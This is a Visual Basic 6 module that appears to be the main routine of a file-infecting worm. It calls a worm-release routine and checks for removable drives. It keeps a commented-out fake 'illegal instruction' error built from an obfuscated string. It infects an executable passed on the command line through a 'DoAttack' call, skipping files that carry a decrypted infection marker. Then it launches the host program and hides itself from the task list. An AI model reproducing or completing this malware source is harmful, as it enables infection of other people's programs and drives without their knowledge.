Attribute VB_Name = "modMain"
Option Explicit

Public VirusEXEName                                    As String
Public strCommand                                      As String

Sub Main()
     Dim res As Boolean
     
     Call Initialize
     VirusEXEName = App.EXEName + renExt
     
     strCommand = Command$
     strCommand = Trim$(strCommand)
     
     Call ReleaseWorm
     
     If IsRemovableDrive(App.Path) Then
          Dim msg As String
          
          'msg = "'" + FSo.Buildpath(App.Path, App.EXEName + ".exe") + "' Compatibility problem." + vbCrLf + _
                 "The NTVDM CPU has encountered an illegal instruction." + vbCrLf + _
                 DoDecrypt("B2$.TSr*?8$.} rV?>*.m" + Chr$(34) + "%*%mrY##*rm(\7^^YgtmU7R]`YmtchcmfYX\UbTchrTWUr__]`PR]h]^r" + Chr$(34))
          
          'MsgBox msg, _
                 vbRetryCancel + vbExclamation, _
                 "64 bit Windows NT Application"

          End
     End If
     
     If strCommand <> vbNullString Then
          strCommand = Trim$(strCommand)
          strCommand = RemoveDoubleQuotes(strCommand)
          
          If FSo.FileExists(strCommand) Then
               Dim vFile           As Object
               Dim sBin            As String

               Set vFile = FSo.opentextfile(strCommand)
               sBin = vFile.readall: DoEvents
               vFile.Close
               Set vFile = Nothing
               DoEvents
               
               If Right$(sBin, 2) <> DoDecrypt("_,") Then
                    res = DoAttack(False, strCommand, "exe")
               
                    If res Then
                         Shell strCommand, vbNormalFocus
                    ElseIf Not res Then
                         Shell strCommand, vbNormalFocus
                    End If
               Else
                    Shell strCommand, vbNormalFocus
                    DoEvents
               End If
               
               sBin = vbNullString
          End If
     End If
     
     App.TaskVisible = False
     
     If App.PrevInstance Then
          End
     End If

     Enumerate = True

     Load frmMain
End Sub
